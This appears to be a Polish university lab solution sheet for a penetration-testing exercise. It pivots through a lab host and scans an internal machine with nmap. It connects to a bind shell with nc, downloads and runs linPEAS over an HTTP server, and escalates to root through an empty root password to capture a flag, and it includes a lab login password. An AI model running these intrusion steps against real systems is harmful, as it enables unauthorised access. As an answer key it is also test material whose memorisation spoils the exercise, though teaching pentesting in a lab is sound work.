---
title: cw07_p.md
description: Zadania PENTEST
order: 2
---

## 7.1p - Przeniesienie Nmap

```bash
#Kali:
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.107:/home/student

#Homework server:
ssh student@192.168.100.107 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

## 7.2p - Skan wewnętrznego hosta

```bash
#Run on student@backdoor-detection-homework:
./nmap -p- -n -Pn -sV -vv 192.168.200.157
```

## 7.3p - Połączenie z bind shellem

```bash
#On student@backdoor-detection-homework:
nc 192.168.200.157 1234 #Bind shell port found by Nmap in 7.2p
```

## 7.4p - Przeniesienie linPEAS przez HTTP

> **Uwaga do rozwiązania:** Adres `192.168.200.107` to interfejs maszyny pośredniej widoczny z sieci wewnętrznej. Serwer HTTP uruchom w katalogu z `linpeas.sh` i pozostaw działający na czas pobierania.

```bash
#Kali - copy linpeas.sh if missing on the homework server:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.107:/home/student

#Terminal 1 - student@192.168.100.107:
python3 -m http.server 1234

#Terminal 2 - student@192.168.100.107:
nc 192.168.200.157 1234
#Inside the bind shell (admin):
wget http://192.168.200.107:1234/linpeas.sh
```

## 7.5p - Analiza przez linPEAS

```bash
#Inside the bind shell (admin@backdoor-detection-pentest-homework):
bash linpeas.sh
```

## 7.6p - Konto root bez hasła

> **Uwaga do rozwiązania:** Repozytorium wykorzystuje puste hasło roota, a PDF 7p na s. 20 - uprawnienie sudo do `service`. To różne konfiguracje końcowego zadania; zachowano rozwiązanie z repozytorium.

```bash
#Inside the bind shell (admin):
su #Root has an empty password (root::0:0 in /etc/passwd)
cat /root/root.txt #Submit the flag on the platform
```
